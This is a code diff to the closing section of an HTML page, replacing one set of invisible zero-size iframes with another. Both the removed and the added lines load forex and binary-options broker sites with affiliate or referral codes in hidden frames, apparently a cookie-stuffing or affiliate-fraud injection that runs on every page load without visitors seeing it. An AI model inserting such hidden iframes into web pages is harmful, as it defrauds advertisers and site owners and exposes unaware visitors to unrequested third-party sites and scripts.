@@ -105,12 +105,12 @@
 	  });
 	</script>
   
-<iframe src="https://www.icmarkets.com/?camp=29251" width="0" height="0" tabindex="-1" title="empty" class="hidden" style="height:0px;width:0px;border:none;"></iframe>
-<iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms"  src="https://www.instaforex.com/?x=BEPI" width="0" height="0" tabindex="-1" title="empty" class="hidden"  style="height:0px;width:0px;border:none;"></iframe>
-<iframe src="https://record.binary.com/_QwNUbDkATGutBVQhPcxVXGNd7ZgqdRLk/1/" sandbox="allow-same-origin allow-scripts allow-popups allow-forms"  width="0" height="0" tabindex="-1" title="empty" class="hidden"  style="height:0px;width:0px;border:none;"></iframe> 
-<iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms" src="https://fbs.com/?ppk=sososo" width="0" height="0" tabindex="-1" title="empty" class="hidden"></iframe>
-<iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms" src="https://www.exness.com/a/n30u10v0" width="0" height="0" tabindex="-1" title="empty" class="hidden"></iframe>
-
+ <iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms" src="http://www.instaforex.com/?x=BEPI" width="0" height="0" tabindex="-1" title="empty" class="hidden"></iframe>
+ <iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms" src="https://www.icmarkets.com/?camp=29251" width="0" height="0" tabindex="-1" title="empty" class="hidden"></iframe>
+ <iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms" src="https://record.binary.com/_QwNUbDkATGutBVQhPcxVXGNd7ZgqdRLk/1/" width="0" height="0" tabindex="-1" title="empty" class="hidden"></iframe>
+ <iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms" src="https://fbs.com/?ppk=sososo" width="0" height="0" tabindex="-1" title="empty" class="hidden"></iframe>
+ <iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms" src="https://www.exness.com/a/n30u10v0" width="0" height="0" tabindex="-1" title="empty" class="hidden"></iframe>
+ 
  
 </body>
 
